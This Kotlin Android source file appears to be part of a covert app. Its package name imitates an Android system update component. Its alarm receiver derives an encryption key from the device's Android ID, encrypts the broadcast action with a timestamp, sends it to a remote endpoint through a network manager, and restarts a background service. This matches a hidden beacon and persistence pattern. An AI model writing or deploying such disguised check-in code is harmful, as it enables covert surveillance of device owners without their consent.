package com.android.system.update.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Base64
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class AlarmReceiver : BroadcastReceiver() {

    private val random = SecureRandom()
    private lateinit var deviceKey: ByteArray
    private lateinit var networkManager: NetworkConnectionManager

    override fun onReceive(context: Context, intent: Intent) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
        networkManager = NetworkConnectionManager(context)

        val action = intent.action ?: "alarm_triggered"
        val encrypted = encrypt("$action|${System.currentTimeMillis()}")
        val payload = Base64.encodeToString(encrypted, Base64.NO_WRAP)
        networkManager.sync(payload)

        val serviceIntent = Intent(context, BackgroundCoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent)
        } else {
            context.startService(serviceIntent)
        }
    }

    private fun encrypt(data: String): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data.toByteArray())
        return iv + encrypted
    }
}